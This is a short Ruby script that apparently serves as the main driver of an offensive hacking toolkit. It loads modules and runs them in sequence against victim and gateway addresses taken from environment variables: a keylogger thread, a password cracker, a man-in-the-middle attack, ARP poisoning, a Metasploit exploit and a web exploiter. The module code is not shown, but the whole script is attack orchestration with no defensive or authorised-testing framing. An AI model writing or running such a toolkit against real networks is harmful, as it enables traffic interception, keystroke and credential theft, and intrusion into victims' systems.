#!/usr/bin/env ruby
require 'dotenv/load'
require_relative '../lib/mitm_attack'
require_relative '../lib/network_scan'
require_relative '../lib/web_scan'
require_relative '../lib/keylogger'
require_relative '../lib/password_cracker'
require_relative '../lib/metasploit'
require_relative '../lib/arp_poisoning'
require_relative '../lib/web_exploiter'

if __FILE__ == $0
  target_ip = ENV['TARGET_IP']
  ports_to_scan = ENV['PORTS_TO_SCAN'].split(',').map(&:to_i)
  NetworkScan.port_scan(target_ip, ports_to_scan)

  target_url = ENV['TARGET_URL']
  WebScan.web_vulnerability_scan(target_url)

  Thread.new { Keylogger.keylogger }

  password_dictionary = ENV['PASSWORD_DICTIONARY'].split(',')
  target_password = ENV['TARGET_PASSWORD']
  PasswordCracker.password_cracker(password_dictionary, target_password)

  network_interface = ENV['NETWORK_INTERFACE']
  victim_ip = ENV['VICTIM_IP']
  gateway_ip = ENV['GATEWAY_IP']
  MitmAttack.mitm_attack(network_interface, victim_ip, gateway_ip)

  metasploit_target_ip = ENV['TARGET_IP']
  metasploit_target_port = ENV['METASPLOIT_TARGET_PORT']
  Metasploit.metasploit_exploit(metasploit_target_ip, metasploit_target_port)

  ArpPoisoning.arp_poisoning(victim_ip, gateway_ip)

  exploiter = WebExploiter.new
  exploiter.exploit
end
